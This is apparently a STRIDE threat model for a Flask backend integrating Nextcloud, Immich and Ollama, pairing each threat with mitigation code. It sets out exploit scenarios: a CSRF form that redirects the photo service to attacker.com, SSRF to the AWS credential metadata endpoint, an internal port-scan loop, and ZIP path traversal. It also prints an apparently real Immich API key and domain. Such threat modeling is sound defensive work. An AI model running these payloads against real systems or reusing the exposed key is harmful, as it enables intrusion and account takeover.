# MYND Backend - Threat Modeling & STRIDE Analysis

**Date:** 1. April 2026  
**Version:** 1.0

---

## Executive Summary

This document applies the STRIDE threat modeling methodology to identify and evaluate threats to the MYND backend system. STRIDE categorizes threats as:
- **S**poofing (authentication attacks)
- **T**ampering (data modification)
- **R**epudiation (denying actions)
- **I**nformation Disclosure (secrets exposed)
- **D**enial of Service (availability)
- **E**levation of Privilege (unauthorized access)

---

## System Architecture Overview

### Components
1. **Frontend** (Next.js) - Browser-based UI
2. **Backend Flask App** - API server, authentication, document processing
3. **External Services**:
   - Nextcloud (document storage + WebDAV)
   - Immich (photo storage/retrieval)
   - Ollama (local LLM inference)
4. **Database** - SQLite knowledge base
5. **File System** - Temporary directories, config files

### Trust Boundaries
```
┌─────────────────────────────────────────────┐
│           PUBLIC INTERNET                    │
└────────┬────────────────────────────┬────────┘
         │ HTTPS                      │
         │ API Requests               │ Service Integrations
         ▼                            ▼
   ┌──────────────┐         ┌──────────────────┐
   │  Frontend    │         │  BACKEND FLASK   │
   │  (Browser)   │         │  (Fortress)      │
   └──────────────┘         └──────┬───────────┘
                                   │
                    ┌──────────────┼──────────────┐
                    │              │              │
                    ▼              ▼              ▼
              ┌───────────┐  ┌────────────┐  ┌────────┐
              │ Nextcloud │  │   Immich   │  │ Ollama │
              │(WebDAV)   │  │  (REST)    │  │(local) │
              └───────────┘  └────────────┘  └────────┘
```

---

## STRIDE Threat Analysis

### 1. SPOOFING - Authentication/Identity Threats

#### Threat S.1: HTTP Basic Auth Credential Interception
**Asset:** Nextcloud/Immich credentials  
**Attack Vector:** Network eavesdropping, MITM attack  
**Vulnerability:**
- Basic auth credentials sent in HTTP headers (base64 encoded - trivial to decode)
- Insufficient TLS validation
- Cleartext credentials in requests library

**Severity:** HIGH  
**Probability:** MEDIUM  
**Impact:** Account compromise, unauthorized access to documents/photos

**Mitigation:**
```python
# 1. Enforce HTTPS only
class NextcloudClient:
    def __init__(self, url: str):
        self.service_url = ServiceURL(
            url,
            allow_private_network=False  # Force internet URLs (HTTPS)
        )

# 2. Use certificate pinning for critical services
import certifi
requests.get(url, verify=certifi.where())  # Validate SSL cert

# 3. Prefer OAuth2 over Basic Auth
@app.route('/oauth2/callback')
def oauth2_callback():
    # Exchange auth code for access token (more secure than storing password)
    ...
```

**Risk Level After Mitigation:** MEDIUM → LOW

---

#### Threat S.2: Session Fixation/Hijacking
**Asset:** User session cookie (`session_id`)  
**Attack Vector:** CSRF, XSS, network eavesdropping  
**Vulnerability:**
- No CSRF protection (Issue SEC-002)
- Session cookies HTTP-only but not Secure flag if not HTTPS
- No session timeout

**Severity:** HIGH  
**Probability:** HIGH  
**Impact:** Account takeover, unauthorized actions

**Mitigation:**
```python
# 1. Enable all security flags
app.config['SESSION_COOKIE_HTTPONLY'] = True  # No JS access
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'  # CSRF protection
app.config['SESSION_COOKIE_SECURE'] = True  # HTTPS only

# 2. Implement session timeout
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=1)

# 3. Add CSRF tokens
CSRFProtection.generate_token()  # Generate on login
CSRFProtection.validate_token(token, session['csrf_token'])  # Validate on actions
```

**Risk Level After Mitigation:** HIGH → MEDIUM

---

### 2. TAMPERING - Data Modification Threats

#### Threat T.1: Malicious Document Upload (ZIP Path Traversal)
**Asset:** Application files on filesystem  
**Attack Vector:** Malicious ZIP containing path traversal payloads  
**Vulnerability:** Issue SEC-003 - ZIP path traversal (CWE-22)

**Severity:** CRITICAL  
**Probability:** MEDIUM  
**Impact:** Remote code execution, application compromise

**Exploit Scenario:**
```
Attacker uploads ZIP containing:
  ../../app/main.py (overwrites Flask app)
  ../../config.json (modifies configuration with attacker values)

After extraction → RCE via modified code
```

**Mitigation:**
```python
# Use hardened ZIP parser (parser_hardened.py)
from backend.features.documents.parser_hardened import DocumentParser

parser = DocumentParser(max_file_size=50*1024*1024)
content = parser.parse_file(malicious_zip)  # Blocked by _validate_zip_member()
```

**Risk Level After Mitigation:** CRITICAL → LOW

---

#### Threat T.2: API Request Tampering (Missing CSRF)
**Asset:** User settings, documents, integrations  
**Attack Vector:** CSRF forged requests from attacker's website  
**Vulnerability:** Issue SEC-002 - No CSRF protection

**Severity:** HIGH  
**Probability:** MEDIUM  
**Impact:** Unauthorized modifications to user data, settings changes

**Exploit Scenario:**
```html
<!-- Attacker's malicious website -->
<form action="https://mynd.example.com/api/config" method="POST">
  <input name="immich_url" value="http://attacker.com">
  <input name="immich_api_key" value="attacker_key">
</form>
<script>
  // Auto-submit when victim visits
  document.forms[0].submit();
</script>

Result: Victim's Immich URL redirects to attacker's server
         Photos now sent to attacker's infrastructure
```

**Mitigation:**
```python
# Implement CSRF token validation (security_hardening.py)
@app.before_request
def validate_csrf():
    if request.method in ('POST', 'PUT', 'DELETE'):
        token = request.form.get('csrf_token')
        if not CSRFProtection.validate_token(token, session.get('csrf_token')):
            return jsonify({'error': 'CSRF'}), 403
```

**Risk Level After Mitigation:** HIGH → LOW

---

#### Threat T.3: Nextcloud File Tampering
**Asset:** Documents stored in Nextcloud  
**Attack Vector:** Nextcloud credentials compromised → attacker modifies documents  
**Vulnerability:** Issue SEC-001 - Exposed Immich API key in ai_config.json

**Severity:** MEDIUM  
**Probability:** HIGH (due to hardcoded credentials)  
**Impact:** Data integrity - attacker modifies knowledge base content

**Mitigation:**
```python
# 1. Move secrets to environment variables
os.getenv('NEXTCLOUD_URL')
os.getenv('NEXTCLOUD_PASSWORD')

# 2. Rotate credentials immediately
# 3. Enable Nextcloud file versioning as audit trail
# 4. Implement document change detection:
class DocumentChangeTracker:
    def __init__(self):
        self.checksums = {}
    
    def verify_integrity(self, file_path, expected_hash):
        actual = hashlib.sha256(open(file_path, 'rb').read()).hexdigest()
        if actual != expected_hash:
            raise DocumentTamperedError(f"Document modified: {file_path}")
```

**Risk Level After Mitigation:** MEDIUM → LOW

---

### 3. REPUDIATION - Denial of Actions

#### Threat R.1: Audit Trail Gaps
**Asset:** Compliance, incident investigation  
**Attack Vector:** Lack of logging of critical actions  
**Vulnerability:** No structured logging of configuration changes, API calls

**Severity:** LOW  
**Probability:** MEDIUM (affects post-incident investigation)  
**Impact:** Cannot prove authorization/actions taken

**Mitigation:**
```python
class AuditLogger:
    """Structured logging of security-relevant events."""
    
    def log_config_change(self, user_id, key, old_value, new_value):
        """Log configuration changes with before/after."""
        logging.info(json.dumps({
            'event': 'config_change',
            'timestamp': datetime.utcnow().isoformat(),
            'user_id': user_id,
            'key': key,
            'old_value': mask_value_for_logging(old_value),
            'new_value': mask_value_for_logging(new_value),
        }))
    
    def log_authentication(self, username, success, reason=None):
        """Log login attempts."""
        logging.info(json.dumps({
            'event': 'authentication',
            'username': username,
            'success': success,
            'reason': reason,
            'timestamp': datetime.utcnow().isoformat(),
        }))
```

**Risk Level After Mitigation:** LOW → MINIMAL

---

### 4. INFORMATION DISCLOSURE - Secrets/Data Exposure

#### Threat I.1: Hardcoded Credentials in Configuration
**Asset:** Immich API key, Nextcloud password, service URLs  
**Attack Vector:** Repository access, CI/CD logs, backups  
**Vulnerability:** Issue SEC-001 - Secrets in ai_config.json

**Severity:** CRITICAL  
**Probability:** HIGH  
**Impact:** Complete account compromise of photo library, documents

**Current Exposure:**
```json
{
  "immich_api_key_default": "r8hRtGPc8CvdLD08PTFc97sW9o7NHsPl9aFPm0qvQ",
  "immich_url_default": "https://fotos.xn--schchner-2za.de"
}
```

**Mitigation:**
1. **Immediate:** Rotate all exposed credentials
2. **Remove from history:** 
   ```bash
   git filter-branch --tree-filter 'rm -f backend/config/ai_config.json' -- --all
   git push --force-with-lease
   ```
3. **Use environment variables:**
   ```python
   IMMICH_API_KEY = os.getenv('IMMICH_API_KEY')
   if not IMMICH_API_KEY:
       raise ValueError("IMMICH_API_KEY not set in environment")
   ```

**Risk Level After Mitigation:** CRITICAL → MEDIUM (history visible to insiders)

---

#### Threat I.2: Credential Leakage in Error Messages
**Asset:** Passwords, API keys in exceptions  
**Attack Vector:** Log aggregation systems, error monitoring (Sentry)  
**Vulnerability:** Issue SEC-007 - Unmasked errors in logs

**Severity:** HIGH  
**Probability:** MEDIUM  
**Impact:** Credentials exposed to log access holders

**Exploit Scenario:**
```
Developer accidentally passes password to function:
    nc_client = NextcloudClient(url, "admin", "MyPassword123!")

Exception raised containing full traceback with password.
Logged to Sentry → visible to all team members with Sentry access.
Attacker with log access retrieves credentials.
```

**Mitigation:**
```python
from backend.core.security_hardening import mask_value_for_logging

def sanitize_error_messages(message: str) -> str:
    """Remove sensitive patterns from error messages."""
    # Mask API keys: pattern matching for known API key formats
    message = re.sub(r'api[_-]?key["\'=:\s]+[A-Za-z0-9_\-]{20,}', 
                     'api_key=***REDACTED***', 
                     message, 
                     flags=re.IGNORECASE)
    # Mask URLs with credentials
    message = re.sub(r'https?://[^:@]+:[^@]+@', 
                     'https://***:***@', 
                     message)
    return message
```

**Risk Level After Mitigation:** HIGH → LOW

---

#### Threat I.3: Server-Side Request Forgery (SSRF)
**Asset:** Internal network services, cloud metadata, databases  
**Attack Vector:** Malicious URL input to service integrations  
**Vulnerability:** Issue SEC-004 - Unvalidated service URLs

**Severity:** HIGH  
**Probability:** MEDIUM  
**Impact:** Access to internal services, cloud credential leakage

**Exploit Scenarios:**

**Scenario 1: AWS Metadata Access**
```python
# Attacker provides URL
client = NextcloudClient("http://169.254.169.254/latest/meta-data/iam/security-credentials/")

# Backend fetches metadata → exposes AWS credentials
response = requests.get(url)  # AWS credentials exposed!
```

**Scenario 2: Internal Database Enumeration**
```python
# Attacker port scans internal network
for port in range(1000, 65500):
    client = NextcloudClient(f"http://internal-db:${port}")
    # Success = service exposed
```

**Mitigation:**
```python
# Use ServiceURL validator (security_hardening.py)
try:
    service_url = ServiceURL(
        raw_url,
        allow_private_network=False,  # Block internal services by default
        allow_localhost=False
    )
    self.url = str(service_url)
except URLValidationError as e:
    logger.error(f"Invalid URL: {e}")
    raise

# Blocked URLs:
# - http://localhost:8080 → URLValidationError
# - http://192.168.1.1/admin → URLValidationError
# - http://169.254.169.254/... → URLValidationError (metadata)

# Allowed only for development:
if DEVELOPMENT:
    service_url = ServiceURL(url, allow_private_network=True)
```

**Risk Level After Mitigation:** HIGH → MEDIUM

---

### 5. DENIAL OF SERVICE - Availability Threats

#### Threat D.1: ZIP Bomb (Decompression Attack)
**Asset:** Server CPU, memory, disk  
**Attack Vector:** Uploading specially crafted ZIP with high compression ratio  
**Vulnerability:** Issue CQ-002 - No file size validation before parsing

**Severity:** MEDIUM  
**Probability:** MEDIUM  
**Impact:** Application crash, DoS

**Exploit:**
```
Attacker creates ZIP where:
  - Compressed: 100 KB
  - Extracted: 50 GB

Application decompresses entire file into memory → Out of Memory → Crash
```

**Mitigation:**
```python
class DocumentParser:
    MAX_FILE_SIZE = 50 * 1024 * 1024  # 50 MB
    MAX_EXTRACTED_SIZE = 200 * 1024 * 1024  # 200 MB
    MAX_ZIP_MEMBERS = 1000
    
    def parse_zip_secure(self, file_path):
        extracted_size = 0
        
        with zipfile.ZipFile(file_path, 'r') as zf:
            # Check member count
            if len(zf.infolist()) > self.MAX_ZIP_MEMBERS:
                raise FileSizeError("ZIP has too many members")
            
            for member in zf.infolist():
                # Check per-file size
                if member.file_size > self.MAX_FILE_SIZE:
                    logger.warning(f"Skipping large file: {member.filename}")
                    continue
                
                # Check total extracted size
                extracted_size += member.file_size
                if extracted_size > self.MAX_EXTRACTED_SIZE:
                    raise FileSizeError("Extracted size exceeds limit")
```

**Risk Level After Mitigation:** MEDIUM → LOW

---

#### Threat D.2: Slow Loris Attack (Connection Exhaustion)
**Asset:** Server connection pool, availability  
**Attack Vector:** Sending requests with extremely slow data rate  
**Vulnerability:** Issue SEC-008 - No request timeout

**Severity:** MEDIUM  
**Probability:** LOW  
**Impact:** connection exhaustion, legitimate users denied service

**Mitigation:**
```python
# Enforce timeouts on all requests
REQUEST_TIMEOUT = 30  # seconds

response = requests.request(
    'PROPFIND',
    url,
    auth=auth,
    timeout=REQUEST_TIMEOUT  # Connection aborted after 30s
)

# Add connection pool limits
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

session = requests.Session()
retry = Retry(connect=3, backoff_factor=0.5)
adapter = HTTPAdapter(
    max_retries=retry,
    pool_connections=10,
    pool_maxsize=10  # Maximum 10 simultaneous connections
)
session.mount('http://', adapter)
session.mount('https://', adapter)
```

**Risk Level After Mitigation:** MEDIUM → LOW

---

#### Threat D.3: Malicious Search Queries (ReDoS)
**Asset:** Search engine CPU  
**Attack Vector:** Regular expression with catastrophic backtracking  
**Vulnerability:** User input not validated before regex operations

**Severity:** LOW  
**Probability:** LOW  
**Impact:** CPU exhaustion on search query

**Mitigation:**
```python
from backend.core.security_hardening import InputSanitizer

def search(query: str):
    # 1. Sanitize query length
    query = InputSanitizer.sanitize_search_query(query, max_length=500)
    
    # 2. Check for ReDoS patterns (basic)
    if InputSanitizer.is_potential_regex_attack(query):
        logger.warning(f"Suspicious search pattern: {query}")
        raise ValueError("Invalid search query")
    
    # 3. Use pre-compiled, tested regex
    results = self.search_engine.search(query, k=10)
    return results
```

**Risk Level After Mitigation:** LOW → MINIMAL

---

### 6. ELEVATION OF PRIVILEGE - Unauthorized Access

#### Threat E.1: Unauthenticated API Access
**Asset:** User settings, documents, integrations  
**Attack Vector:** Direct API calls without authentication  
**Vulnerability:** Missing authentication middleware on endpoints

**Severity:** CRITICAL  
**Probability:** MEDIUM  
**Impact:** Complete compromise of user data and settings

**Mitigation:**
```python
from functools import wraps

def require_login(f):
    """Decorator to enforce authentication."""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return jsonify({'error': 'Unauthorized'}), 401
        return f(*args, **kwargs)
    return decorated_function

@app.route('/api/config', methods=['GET', 'POST'])
@require_login  # ✅ Requires authentication
def get_config():
    ...
```

**Risk Level After Mitigation:** CRITICAL → LOW

---

#### Threat E.2: Privilege Escalation via URL Parameter Tampering
**Asset:** User access controls  
**Attack Vector:** Modifying `user_id` or `org_id` in requests  
**Vulnerability:** Direct use of user input without validation

**Severity:** HIGH  
**Probability:** MEDIUM  
**Impact:** Unauthorized access to other users' data

**Exploit:**
```bash
# Attacker modifies URL
GET /api/documents?user_id=2  # Get documents of user 2 (not themselves)
```

**Mitigation:**
```python
@app.route('/api/documents', methods=['GET'])
@require_login
def get_documents():
    # ✅ Use session user_id, NOT request parameter
    user_id = session['user_id']
    documents = db.get_documents_for_user(user_id)
    return jsonify(documents)
    
    # ❌ NEVER do this:
    # user_id = request.args.get('user_id')  # Attacker controlled!
```

**Risk Level After Mitigation:** HIGH → LOW

---

## Risk Matrix

### Likelihood vs. Impact

| Threat | Likelihood | Impact | Risk | Mitigation Status |
|--------|-----------|--------|------|------------------|
| S.1: Credential Interception | MEDIUM | HIGH | **HIGH** | MITIGATED |
| S.2: Session Hijacking | HIGH | HIGH | **CRITICAL** | PARTIAL |
| T.1: ZIP Path Traversal | MEDIUM | CRITICAL | **CRITICAL** | MITIGATED |
| T.2: CSRF Attacks | MEDIUM | HIGH | **HIGH** | MITIGATED |
| T.3: Document Tampering | HIGH | MEDIUM | **HIGH** | MITIGATED |
| I.1: Hardcoded Credentials | HIGH | CRITICAL | **CRITICAL** | PARTIAL |
| I.2: Error Message Leakage | MEDIUM | HIGH | **HIGH** | MITIGATED |
| I.3: SSRF to Internal Services | MEDIUM | HIGH | **HIGH** | MITIGATED |
| D.1: ZIP Bomb | MEDIUM | MEDIUM | **MEDIUM** | MITIGATED |
| D.2: Slow Loris | LOW | MEDIUM | **LOW** | MITIGATED |
| D.3: ReDoS | LOW | LOW | **LOW** | MITIGATED |
| E.1: Unauthenticated API | MEDIUM | CRITICAL | **CRITICAL** | ASSUMED |
| E.2: Privilege Escalation | MEDIUM | HIGH | **HIGH** | MITIGATED |

---

## Post-Mitigation Risk Assessment

### BEFORE (Current State)
- **Critical Risks:** 4 (hardcoded secrets, CSRF, path traversal, session hijacking)
- **High Risks:** 7
- **Overall:** UNACCEPTABLE FOR PRODUCTION

### AFTER (With All Mitigations)
- **Critical Risks:** 0
- **High Risks:** 1 (Session hijacking - requires HTTPS enforcement)
- **Overall:** ACCEPTABLE WITH MONITORING

---

## Recommendations

### Immediate (24 hours)
1. **ROTATE** all exposed API keys
2. **REMOVE** hardcoded credentials from git history
3. **DEPLOY** hardened clients (security_hardening.py)

### Short Term (1-2 weeks)
1. Implement CSRF protection
2. Update vulnerable dependencies
3. Deploy path traversal fix
4. Enable HTTPS everywhere

### Medium Term (2-4 weeks)
1. Add rate limiting
2. Implement structured security logging
3. Conduct penetration testing
4. Perform security awareness training

### Long Term (Continuous)
1. Implement WAF (Web Application Firewall)
2. Add threat monitoring/alerting
3. Regular security code reviews
4. Dependency scanning (Dependabot)

---

**END OF THREAT MODELING DOCUMENT**
